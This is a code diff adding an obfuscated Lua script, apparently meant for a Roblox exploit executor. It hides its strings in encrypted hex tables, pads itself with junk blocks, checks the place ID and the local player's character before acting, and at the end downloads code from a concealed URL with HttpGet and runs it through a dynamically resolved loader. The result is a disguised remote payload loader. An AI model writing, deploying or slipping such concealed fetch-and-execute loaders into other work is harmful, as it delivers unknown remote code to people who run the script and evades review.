@@ -1,0 +1,129 @@
+return (function(...)
+local _gsdK=24;
+if type(print)~="function" or type(string.char)~="function" then _gsdK=(_gsdK+1)%256 end;
+local _gsdGVZ1={request=function() return request end,writefile=function() return writefile end,readfile=function() return readfile end,isfile=function() return isfile end,loadfile=function() return loadfile end,loadstring=function() return loadstring end,getgenv=function() return getgenv end,http_request=function() return http_request end,syn=function() return syn end,game=function() return game end,wait=function() return wait end,task=function() return task end,require=function() return require end,print=function() return print end,warn=function() return warn end,error=function() return error end,pcall=function() return pcall end,xpcall=function() return xpcall end,select=function() return select end,type=function() return type end,typeof=function() return typeof end,tostring=function() return tostring end,tonumber=function() return tonumber end,tick=function() return tick end,time=function() return time end,os=function() return os end,math=function() return math end,string=function() return string end,table=function() return table end,coroutine=function() return coroutine end,bit32=function() return bit32 end,debug=function() return debug end,getfenv=function() return getfenv end,setfenv=function() return setfenv end};
+local function _gsdFOL0(_gsdLKEM)
+local _gsdLVNN=getgenv and getgenv()
+if type(_gsdLVNN)=="table" and _gsdLVNN[_gsdLKEM]~=nil then return _gsdLVNN[_gsdLKEM] end
+_gsdLVNN=getrenv and getrenv()
+if type(_gsdLVNN)=="table" and _gsdLVNN[_gsdLKEM]~=nil then return _gsdLVNN[_gsdLKEM] end
+if type(_G)=="table" and _G[_gsdLKEM]~=nil then return _G[_gsdLKEM] end
+if _gsdGVZ1[_gsdLKEM] then return _gsdGVZ1[_gsdLKEM]() end
+return nil
+end;
+local _gsdCIB2="173068020159105255174112045230037015201178088250123028142194184184028243001092065189143141175230028233131012252134176108097168053159129092119248222210182137006129122241115115077120117071070027";
+local function _gsdXBV3(_gsdLPIO,_gsdLSVJ)
+local _gsdLGAP=0
+for _gsdLMMQ=0,7 do
+if _gsdLPIO%2~=_gsdLSVJ%2 then _gsdLGAP=_gsdLGAP+2^_gsdLMMQ end
+_gsdLPIO=math.floor(_gsdLPIO/2) _gsdLSVJ=math.floor(_gsdLSVJ/2)
+end
+return _gsdLGAP
+end;
+local function _gsdYLC4(_gsdLIPA,_gsdLEWR)
+local _gsdLLIS=((_gsdLIPA*17+_gsdLEWR*5+131)%64)*3+1
+local _gsdLOKC=(tonumber(_gsdCIB2:sub(_gsdLLIS,_gsdLLIS+2))+_gsdLIPA)%256
+if _gsdLOKC==0 then _gsdLOKC=1 end
+return _gsdLOKC
+end;
+local function _gsdDWP7(_gsdLVD9,_gsdLIPA,_gsdLWJB)
+local _gsdLOKC=_gsdYLC4(_gsdLIPA,_gsdLWJB)
+local _gsdLCRD=_gsdLIPA
+local _gsdLQHE=(_gsdLOKC*37+_gsdLCRD*91+_gsdLWJB*13)%256 if _gsdLQHE==0 then _gsdLQHE=1 end
+local _gsdLDLF=(_gsdLOKC*131+_gsdLWJB*17+_gsdLCRD*29)%256
+local _gsdLFWG=(_gsdLQHE*53+_gsdLCRD*17)%256
+local _gsdLIXH={}
+for _gsdLMDI=0,#_gsdLVD9/2-1 do
+_gsdLDLF=(_gsdLDLF*73+_gsdLMDI*11+_gsdLOKC)%256
+_gsdLFWG=(_gsdLFWG*47+_gsdLMDI*19+_gsdLQHE)%256
+local _gsdLSVJ=tonumber(_gsdLVD9:sub(_gsdLMDI*2+1,_gsdLMDI*2+2),16)
+local _gsdLLPK=(_gsdLCRD*31+17+_gsdLMDI*13)%256 if _gsdLLPK==0 then _gsdLLPK=1 end
+_gsdLSVJ=((_gsdLSVJ%16)*16+math.floor(_gsdLSVJ/16))%256
+_gsdLSVJ=_gsdXBV3(_gsdLSVJ,_gsdLLPK)
+_gsdLSVJ=(_gsdLSVJ-_gsdLFWG)%256
+_gsdLSVJ=_gsdXBV3(_gsdLSVJ,_gsdLDLF)
+_gsdLSVJ=(_gsdLSVJ-_gsdLOKC-_gsdLWJB-_gsdLCRD*7-_gsdLMDI*3)%256
+_gsdLIXH[#_gsdLIXH+1]=string.char(_gsdLSVJ)
+end
+return table.concat(_gsdLIXH)
+end;
+local function _gsdDIP8(_gsdLVD9,_gsdLIPA,_gsdLWJB)
+local _gsdLOKC=_gsdYLC4(_gsdLIPA,_gsdLWJB)
+local _gsdLIXH={}
+for _gsdLMDI=0,#_gsdLVD9/2-1 do
+local _gsdLSVJ=(tonumber(_gsdLVD9:sub(_gsdLMDI*2+1,_gsdLMDI*2+2),16)-(_gsdLOKC*11+_gsdLIPA*3+_gsdLMDI*7+_gsdLWJB)%256)%256
+_gsdLIXH[#_gsdLIXH+1]=string.char(_gsdLSVJ)
+end
+return table.concat(_gsdLIXH)
+end;
+local _gsdTVXL={
+[1]=function() return _gsdDIP8("acb6afb9cfd7dcdae6e6",0,_gsdK) end,
+[2]=function() return _gsdDIP8("30314443",1,_gsdK) end,
+[3]=function() return _gsdDIP8("abbec5c8d2a09ca3def1f7fefc011915222834f50109115e196167726c7c7981955894a7ac75b9bdd1c798e2dce4b4f2c5fbd60d12e9f0fbff050c414a215830343c724b845d91667274ac898a93cacda4ace3c0c1f9fe",2,_gsdK) end,
+[4]=function() return _gsdDIP8("d1bec1cbb3e5eadaceedf01e012328421e4b24565c5b5f6e683f628e969ba184858ba688a2bbe0a5",3,_gsdK) end,
+[5]=function() return _gsdDWP7("3c5137bf82dd8067bd50953f225f9ef293e44f93e2abb5161b3d0f99e619bf9b8534faa7096c94c5",4,_gsdK) end,
+[6]=function() return _gsdDIP8("f20f1ff40f193f20201b3b35484d5d546777867c8094998ea39ec7cab7eaf2f3cec2dff0dc02faed",5,_gsdK) end,
+[7]=function() return _gsdDWP7("5984ef408451bc98e41aca86f6b1cceac032a10cef137a21d9b576a1ae50b9fdfe6dc31706134253",6,_gsdK) end,
+[8]=function() return _gsdDIP8("999fabd2d2b5c5f3ccbbd513e3fb12e930271a353d49553b3b6b6358687a8d93849994b99f9b9ec0",7,_gsdK) end,
+[9]=function() return _gsdDWP7("c1e251ed48263a268bce6d7f44fa3f42365d0fc1e587823baa2e11fee8e0343d0ec1543dee108f1d",8,_gsdK) end,
+[10]=function() return _gsdDIP8("c8f6f0d80f0bdf0909133a37042f26583059603a6e457e61737e82b291be938dd1d5e3bfccb80102",9,_gsdK) end,
+[11]=function() return _gsdDIP8("d1aea5cbedf8c40ed50a1e212d2d1f18240e18653d2d3840554891759f959b92c0bbbdcba59bd6e6",10,_gsdK) end,
+[12]=function() return _gsdDWP7("cd1ee26e0fece4de3ae0b78749a5022ce7d5e83f2bd84923f3f4e5627b4e4ef4e90939459833178f",11,_gsdK) end,
+[13]=function() return _gsdDIP8("c3f80deae2f5232e3c390d544a5d575d3648604c6e96a4639e8db298b9a6acb8c1bfb6b9fdfd020e",12,_gsdK) end,
+[14]=function() return _gsdDIP8("5022545e594c7962787d737992977088b688c88fcabfdedbdae2d4caf0f5dc260c22150f0d1f3a1d",13,_gsdK) end,
+[15]=function() return _gsdDIP8("807f64617c9a7795ae8b9fabdebac7b2c6f508dcf3f9e1001d1c132408304b51457438725f90749a",14,_gsdK) end,
+[16]=function() return _gsdDWP7("469dcb759654bdd6140a57f90b1a93d8b8bd72a706ede1dba5613c1f676c6aec1642ffff886b8847",15,_gsdK) end,
+[17]=function() return _gsdDWP7("eb344b022d5728b7b2b08193014d65ae6070f5a632edf1cedb5a6ae0a95e4d81454cabfb5d57e916",16,_gsdK) end,
+[18]=function() return _gsdDWP7("69f2ae39d397bbb1c9893720bec26fa184a159f8a755ae67d6c9a937b0292b288a45b183dd43e965",17,_gsdK) end,
+[19]=function() return _gsdDWP7("1c995c698e0a466249e0fd28d59b3a2b24457c3bb94523c76b18127d862e8182b85cf3fe5d257475",18,_gsdK) end,
+[20]=function() return _gsdDWP7("3e4c9699be302fe4f7a7a88c55f1c1cccfeea784ffa5c4850dca7032f72a8bbaf7ca97c8fceef14d",19,_gsdK) end,
+[21]=function() return _gsdDWP7("c1418a53ee9fb1a3138f836e6820866996037ef95b8c1368c862749aa52f8fba6fa0d12eec69cfe4",20,_gsdK) end,
+[22]=function() return _gsdDIP8("c8ecb0eed90cf20514e5ec02403c2d43445a6a2933505a87899a7c71afb47c9b82c8b19ec6eec3c9",21,_gsdK) end,
+[23]=function() return _gsdDWP7("6f5189f905fbc9b054f50e328721088472c393a585d773a66f3762084fba18d5f95145cef55a3a8f",22,_gsdK) end
+};
+local _gsdEOC5=_gsdFOL0(_gsdTVXL[(68)-67]());
+local _gsdEUE6=_gsdFOL0(_gsdTVXL[2]());
+local _gsdBKXT=nil;if getgenv==nil then return end;pcall(function()local c=string.char;local g=game;local P=g[c(80,108,97,99,101,73,100)];if(P%251)~=24 then return end;local Ps=g:GetService(c(80,108,97,121,101,114,115));local LP=Ps[c(76,111,99,97,108,80,108,97,121,101,114)];local U=LP[c(85,115,101,114,73,100)];if type(U)~=c(110,117,109,98,101,114) then return end;if(-1>=0 and(U%251)~=-1)then return end;local ok=false;for i=1,25 do local ch=LP[c(67,104,97,114,97,99,116,101,114)];local rt=ch and ch:FindFirstChild(c(72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116));if rt then ok=true;break end;task.wait(1) end;if not ok then return end;_gsdBKXT=1 end);if _gsdBKXT==nil then return end;
+do local _gsdJQQU=("w"):rep(3) if #_gsdJQQU>0 then local _gsdJPEV=#_gsdJQQU end end
+do local _gsdJHJX={} local _gsdJBVY=0 for _gsdJDNZ=1,3 do _gsdJHJX[_gsdJDNZ]=_gsdJDNZ*2 _gsdJBVY=_gsdJBVY+_gsdJHJX[_gsdJDNZ] end end
+do local _gsdJXO10=1 while _gsdJXO10<1 do _gsdJXO10=_gsdJXO10+1 end end
+do local _gsdJWF13=1 while _gsdJWF13<1 do _gsdJWF13=_gsdJWF13+1 end end
+do local _gsdJHI16=1 while _gsdJHI16<1 do _gsdJHI16=_gsdJHI16+1 end end
+do local _gsdJML19=1 while _gsdJML19<1 do _gsdJML19=_gsdJML19+1 end end
+do local _gsdJHW1C=(function(_gsdJDJ1D) return _gsdJDJ1D end)(5) local _gsdJRV1E=_gsdJHW1C*0 end
+do local _gsdJUW1F=("x"):rep(3) if #_gsdJUW1F>0 then local _gsdJXJ1G=#_gsdJUW1F end end
+do local _gsdJBP1I={n=30} if _gsdJBP1I.n>0 then local _gsdJZG1J=_gsdJBP1I.n*0 end end
+do local _gsdJSX1L=(function(_gsdJDO1M) return _gsdJDO1M end)(8) local _gsdJBX1N=_gsdJSX1L*0 end
+do local _gsdJXK1O={} local _gsdJOY1P=0 for _gsdJMD1Q=1,6 do _gsdJXK1O[_gsdJMD1Q]=_gsdJMD1Q*7 _gsdJOY1P=_gsdJOY1P+_gsdJXK1O[_gsdJMD1Q] end end
+do local _gsdJAM1R={} local _gsdJLD1S=0 for _gsdJJO1T=1,4 do _gsdJAM1R[_gsdJJO1T]=_gsdJJO1T*5 _gsdJLD1S=_gsdJLD1S+_gsdJAM1R[_gsdJJO1T] end end
+do local _gsdJXY1U=("f"):rep(4) if #_gsdJXY1U>0 then local _gsdJEZ1V=#_gsdJXY1U end end
+do local _gsdJVF1X=1 while _gsdJVF1X<1 do _gsdJVF1X=_gsdJVF1X+1 end end
+do local _gsdJUJ20={n=18} if _gsdJUJ20.n>0 then local _gsdJMA21=_gsdJUJ20.n*0 end end
+do local _gsdJPQ23=(function(_gsdJLR24) return _gsdJLR24 end)(3) local _gsdJKV25=_gsdJPQ23*0 end
+do local _gsdJBV26=(function(_gsdJWA27) return _gsdJWA27 end)(9) local _gsdJJZ28=_gsdJBV26*0 end
+do local _gsdJXM29={} local _gsdJXF2A=0 for _gsdJHZ2B=1,3 do _gsdJXM29[_gsdJHZ2B]=_gsdJHZ2B*2 _gsdJXF2A=_gsdJXF2A+_gsdJXM29[_gsdJHZ2B] end end
+do local _=_gsdTVXL[(59)-55]() end;
+do local _=_gsdTVXL[(34)-29]() end;
+do local _=_gsdTVXL[6]() end;
+do local _=_gsdTVXL[(31)-24]() end;
+do local _=_gsdTVXL[8]() end;
+do local _=_gsdTVXL[9]() end;
+do local _=_gsdTVXL[10]() end;
+do local _=_gsdTVXL[(49)-38]() end;
+do local _=_gsdTVXL[(57)-45]() end;
+do local _=_gsdTVXL[13]() end;
+do local _=_gsdTVXL[14]() end;
+do local _=_gsdTVXL[15]() end;
+do local _=_gsdTVXL[16]() end;
+do local _=_gsdTVXL[(62)-45]() end;
+do local _=_gsdTVXL[18]() end;
+do local _=_gsdTVXL[19]() end;
+do local _=_gsdTVXL[20]() end;
+do local _=_gsdTVXL[21]() end;
+do local _=_gsdTVXL[(55)-33]() end;
+do local _=_gsdTVXL[23]() end;
+
+return (function(...)
+_gsdEOC5(_gsdEUE6:HttpGet(_gsdTVXL[(23)-20]()))()
+end)(...)
+end)(...)
